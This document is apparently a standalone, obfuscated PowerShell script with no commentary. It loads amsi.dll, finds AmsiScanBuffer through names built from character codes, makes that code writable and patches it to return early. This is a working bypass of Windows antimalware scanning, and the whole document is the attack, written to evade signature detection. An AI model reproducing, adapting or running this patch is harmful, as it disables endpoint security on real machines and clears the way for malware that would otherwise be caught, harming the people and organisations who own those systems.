$YUQzSECXg_SIlXk = @"
using System;
using System.Runtime.InteropServices;
public class YUQzSECXg_SIlXk {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr aObhuQEh, string b7JkLzsKsoe1bY);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr yKeteNNR, UIntPtr UVBORJZHUSyFZp9dZ, uint TVMFv2MtHYB6BDw0, out uint kutOzgm7alt);
}
"@

Add-Type $YUQzSECXg_SIlXk

$ZBfeQpNlkK8 = [YUQzSECXg_SIlXk]::LoadLibrary("$([ChAR]([bYte]0x61)+[chAR](86+23)+[ChAR](115+110-110)+[cHaR](105)+[cHar](46)+[chaR](100*10/10)+[cHar](108)+[cHAr](87+21))")
$S_yn2cz_crZ = [YUQzSECXg_SIlXk]::GetProcAddress($ZBfeQpNlkK8, "$([cHar]([BYTE]0x41)+[char](109)+[cHAR](81+34)+[cHAR]([bYte]0x69)+[Char](83)+[chaR]([Byte]0x63)+[CHAR]([bYTe]0x61)+[CHAr]([byTe]0x6e)+[CHAR](66*3/3)+[CHAR](117)+[ChaR]([BYtE]0x66)+[chAR](102+19-19)+[cHaR](101+67-67)+[char](114*52/52))")
$p = 0
[YUQzSECXg_SIlXk]::VirtualProtect($S_yn2cz_crZ, [uint32]5, 0x40, [ref]$p)
$mgAKvPDYsYzDIDEtplg = "0xB8"
$_Pc = "0x57"
$lY_ZZPXnlsd3 = "0x00"
$fyquyT3rRQJgPOo0U = "0x07"
$s9ep = "0x80"
$i5Qs9lIFnuw = "0xC3"
$F0ut9mcit = [Byte[]] ($mgAKvPDYsYzDIDEtplg,$_Pc,$lY_ZZPXnlsd3,$fyquyT3rRQJgPOo0U,+$s9ep,+$i5Qs9lIFnuw)
[System.Runtime.InteropServices.Marshal]::Copy($F0ut9mcit, 0, $S_yn2cz_crZ, 6)